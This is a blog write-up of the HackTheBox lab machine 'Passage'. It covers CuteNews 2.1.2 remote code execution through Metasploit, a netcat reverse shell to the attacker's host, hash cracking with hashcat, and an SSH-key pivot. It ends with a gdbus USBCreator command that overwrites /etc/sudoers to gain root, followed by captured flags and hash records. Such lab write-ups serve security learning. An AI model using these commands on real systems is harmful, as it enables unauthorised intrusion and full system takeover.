<!doctype html>
<html lang="en-us">
  <head>
    <title>HTB - Passage // SixPraxis</title>
    <link rel="shortcut icon" href="/images/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.82.0" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="SixPraxis" />
    <meta name="description" content="Write Up for HackTheBox&#39;s Passage" />
    <link rel="stylesheet" href="https://sixpraxis.github.io/css/main.min.86a2007e438a83c7fd8ff3ced81470ea9a72de62cbb2749eb6c16813ce7eadcb.css" />

    
    <meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="HTB - Passage"/>
<meta name="twitter:description" content="Write Up for HackTheBox&#39;s Passage"/>

    <meta property="og:title" content="HTB - Passage" />
<meta property="og:description" content="Write Up for HackTheBox&#39;s Passage" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://sixpraxis.github.io/posts/passage/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-04-06T00:00:00&#43;00:00" />
<meta property="article:modified_time" content="2021-04-06T00:00:00&#43;00:00" />



  </head>
  <body>
    <header class="app-header">
      <a href="https://sixpraxis.github.io"><img class="app-header-avatar" src="/images/avatar.png" alt="SixPraxis" /></a>
      <h1>SixPraxis</h1>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/tags/">Tags</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p>Mostly interested in networking and cyber security, but into all sorts of things.</p>
      <div class="app-header-social">
        
          <a href="https://github.com/sixpraxis" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>Github</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://app.hackthebox.eu/profile/139574" target="_blank" rel="noreferrer noopener">
            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-htb">
  <title>HackTheBox</title>
  <path d="M11.996 0a1.119 1.119 0 0 0-.057.003a.9.9 0 0 0-.236.05a.907.907 0 0 0-.165.079L1.936 5.675a.889.889 0 0 0-.445.77V17.556a.889.889 0 0 0 .47.784l9.598 5.541l.054.029v.002a.857.857 0 0 0 .083.035l.012.004c.028.01.056.018.085.024c.01.001.011.003.016.004a.93.93 0 0 0 .296.015a.683.683 0 0 0 .086-.015c.01 0 .011-.002.016-.004a.94.94 0 0 0 .085-.024l.012-.004a.882.882 0 0 0 .083-.035v-.002a1.086 1.086 0 0 0 .054-.029l9.599-5.541a.889.889 0 0 0 .469-.784V6.48l-.001-.026v-.008a.889.889 0 0 0-.312-.676l-.029-.024c0-.002-.01-.005-.01-.007a.899.899 0 0 0-.107-.07L12.453.127A.887.887 0 0 0 11.99 0zm.01 2.253c.072 0 .144.019.209.056l6.537 3.774a.418.418 0 0 1 0 .724l-6.537 3.774a.418.418 0 0 1-.418 0L5.26 6.807a.418.418 0 0 1 0-.724l6.537-3.774a.42.42 0 0 1 .209-.056zm-8.08 6.458a.414.414 0 0 1 .215.057l6.524 3.766a.417.417 0 0 1 .208.361v7.533a.417.417 0 0 1-.626.361l-6.523-3.766a.417.417 0 0 1-.209-.362V9.13c0-.241.196-.414.41-.418zm16.16 0c.215.004.41.177.41.418v7.532c0 .15-.08.287-.208.362l-6.524 3.766a.417.417 0 0 1-.626-.361v-7.533c0-.149.08-.286.209-.36l6.523-3.767a.415.415 0 0 1 .216-.057z" fill="#626262"/>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">HTB - Passage</h1>
      <div class="post-meta">
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Apr 6, 2021
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          3 min read
        </div>
        <div>
          <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tag">
  <title>tag</title>
  <path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7.01" y2="7"></line>
</svg>
              <a class="tag" href="https://sixpraxis.github.io/tags/hackthebox/">hackthebox</a>
              <a class="tag" href="https://sixpraxis.github.io/tags/passage/">passage</a>
              <a class="tag" href="https://sixpraxis.github.io/tags/medium/">medium</a>
        </div>
      </div>
    </header>
    <div class="post-content">
      <p><img src="/images/htb-passage/passage.png" alt=""></p>
<h1 id="passage">Passage</h1>
<h4 id="10129560-release-arena">10.129.5.60 (Release Arena)</h4>
<h5 id="by-sixpraxis">by SixPraxis</h5>
<h3 id="write-up">Write-Up</h3>
<p>Port 80 contained a news blog being run on the CuteNews cms software. http://10.129.5.60/CuteNews/ provided the version number of 2.1.2 and a login page. Searching the version number revealed three known exploits:</p>
<pre><code>CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)           | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                               | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                   | php/webapps/48458.txt
</code></pre><p>Exploit 48458 allows file upload with a low level user, so the attacker registered for the website with <code>gunship : gunship1</code> to get access to vulnerable area of the site. The intended exploit, 46698, does not come with metasploit, so it was copied into the appropriate directory.</p>
<pre><code>sudo mkdir -p /root/.msf4/modules/exploits/unix/webapp/
sudo cp /usr/share/exploitdb/exploits/php/remote/46698.rb /root/.msf4/modules/exploits/unix/webapp/cutenews_avatar_rce.rb
</code></pre><p>Upon loading the msf console, an error for the cutenews module popped up. This was fixed by adding a missing comma to the references array, at the end of the first URL object.</p>
<pre><code>      'References' =&gt;
        [
          ['URL', 'http://pentest.com.tr/exploits/CuteNews-2-1-2-Remote-Code-Execution-Metasploit.html'],
          ['URL', 'http://cutephp.com'] # Official Website
        ],
</code></pre><p><img src="/images/htb-passage/msfsearch.png" alt=""></p>
<p>The RHOSTS, LHOST, USERNAME, and PASSWORD options needed to be set(e.g. <code>set RHOSTS 10.129.5.60</code>). The payload is set to <code>php/exec</code> and <code>set CMD 'nc -e /bin/bash 10.10.14.18 4040'</code> to create a normal reverse shell. A listener was setup(<code>nc -nvlp 4040</code>), the exploit was run and our reverse shell pops as www-data. The shell was then upgraded to tty with <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code>.</p>
<p>The passwd file shows two main user accounts, paul and nadav. Both of their home directories were unaccessible by the www-data user. The attacker downloaded an enumeration script, LinEnum.sh, from his machine&rsquo;s web server and executed it to assist with finding any vulnerabilities. In the /var/www/html/CuteNews/cdata/users directory a file called <code>lines.txt</code> contains Base64 encoded data. Upon decoding, the CMS&rsquo;s user information is revealed, including SHA256 hashed account passwords. Using hashcat and the rockyou word list, paul&rsquo;s password is cracked and found to be <code>atlanta1</code>.   <code>hashcat -m 1400 -a 0 CNhashes.txt rockyou.txt</code></p>
<p>Switching users with <code>su paul</code> allowed access into his user directory and the user flag is found!</p>
<p><img src="/images/htb-passage/userflag.png" alt=""></p>
<p>At this point, the attacker dropped his ssh key into the ~/.ssh/authorized_keys file and switched to an ssh connection to get a full terminal. <code>sudo -l</code> shows that Paul isn&rsquo;t allowed to run sudo. LinEnum.sh is run again under Paul&rsquo;s account. Looking nadav&rsquo;s group settings, pivoting to that account would most likely get us closer to our goal. Looking at the known hosts file shows connections for localhost, which is odd. The  id_rsa ssh key file was copied to the attackers machine and used to attempt to connect using ssh as nadav, success! The attacker had a shell as nadav, but still did not have nadav&rsquo;s password, so the sudo command was still out of reach.</p>
<p>Looking at .viminfo, we see editing of usbcreator files regarding sudo and root permissions. After some googling we come across <code>https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/</code>. This details finding an exploit built into some of the usbcreator service&rsquo;s methods and has a line to test it. We alter the line to drop our own sudoers file that overwrites the one in /etc/. The new one gives us permission to run sudo on any command with no password.</p>
<pre><code>gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/sudoers /etc/sudoers true
</code></pre><p><img src="/images/htb-passage/usbcreatorexploit.png" alt=""></p>
<p>Calling <code>sudo su</code> drops us into a root shell!</p>
<p><img src="/images/htb-passage/rootflag.png" alt=""></p>
<hr>
<h3 id="recon">Recon</h3>
<h5 id="nmap">NMAP</h5>
<pre><code>PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</code></pre><h6 id="port-80">Port 80</h6>
<p>Passage news website. &ldquo;Powered by CuteNews&rdquo;. Implemented &ldquo;Fail2Ban&rdquo; post.</p>
<hr>
<h3 id="credentials">Credentials</h3>
<pre><code>User Flag: a2a5169873e37baf2fe6fd87c456e53a
</code></pre><pre><code>Root Flag: 35c76f660048080938bd0716fc978aea
</code></pre><pre><code>a:1:{s:4:&quot;name&quot;;a:1:{s:5:&quot;admin&quot;;a:8:{s:2:&quot;id&quot;;s:10:&quot;1592483047&quot;;s:4:&quot;name&quot;;s:5:&quot;admin&quot;;s:3:&quot;acl&quot;;s:1:&quot;1&quot;;s:5:&quot;email&quot;;s:17:&quot;nadav@passage.htb&quot;;s:4:&quot;pass&quot;;s:64:&quot;7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487988&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}
DECRYPTED: 
</code></pre><pre><code>a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;sid-meier&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483281&quot;;s:4:&quot;name&quot;;s:9:&quot;sid-meier&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;sid@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Sid Meier&quot;;s:4:&quot;pass&quot;;s:64:&quot;4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485645&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}
DECRYPTED:
</code></pre><pre><code>a:1:{s:4:&quot;name&quot;;a:1:{s:10:&quot;paul-coles&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483236&quot;;s:4:&quot;name&quot;;s:10:&quot;paul-coles&quot;;s:3:&quot;acl&quot;;s:1:&quot;2&quot;;s:5:&quot;email&quot;;s:16:&quot;paul@passage.htb&quot;;s:4:&quot;nick&quot;;s:10:&quot;Paul Coles&quot;;s:4:&quot;pass&quot;;s:64:&quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592485556&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;2&quot;;}}}
DECRYPTED: atlanta1
</code></pre><pre><code>a:1:{s:4:&quot;name&quot;;a:1:{s:9:&quot;kim-swift&quot;;a:9:{s:2:&quot;id&quot;;s:10:&quot;1592483309&quot;;s:4:&quot;name&quot;;s:9:&quot;kim-swift&quot;;s:3:&quot;acl&quot;;s:1:&quot;3&quot;;s:5:&quot;email&quot;;s:15:&quot;kim@example.com&quot;;s:4:&quot;nick&quot;;s:9:&quot;Kim Swift&quot;;s:4:&quot;pass&quot;;s:64:&quot;f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca&quot;;s:3:&quot;lts&quot;;s:10:&quot;1592487096&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:3:&quot;cnt&quot;;s:1:&quot;3&quot;;}}}
</code></pre><pre><code>a:1:{s:4:&quot;name&quot;;a:1:{s:6:&quot;egre55&quot;;a:11:{s:2:&quot;id&quot;;s:10:&quot;1598829833&quot;;s:4:&quot;name&quot;;s:6:&quot;egre55&quot;;s:3:&quot;acl&quot;;s:1:&quot;4&quot;;s:5:&quot;email&quot;;s:15:&quot;egre55@test.com&quot;;s:4:&quot;nick&quot;;s:6:&quot;egre55&quot;;s:4:&quot;pass&quot;;s:64:&quot;4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc&quot;;s:4:&quot;more&quot;;s:60:&quot;YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==&quot;;s:3:&quot;lts&quot;;s:10:&quot;1598834079&quot;;s:3:&quot;ban&quot;;s:1:&quot;0&quot;;s:6:&quot;avatar&quot;;s:26:&quot;avatar_egre55_spwvgujw.php&quot;;s:6:&quot;e-hide&quot;;s:0:&quot;&quot;;}}}
DECRYPTED: egre55
</code></pre><h5 id="notes">Notes</h5>
<p>Creds for CuteNews are stored in SHA256_hash.</p>

    </div>
    <div class="post-footer">
      
    </div>
  </article>

    </main>
  </body>
</html>
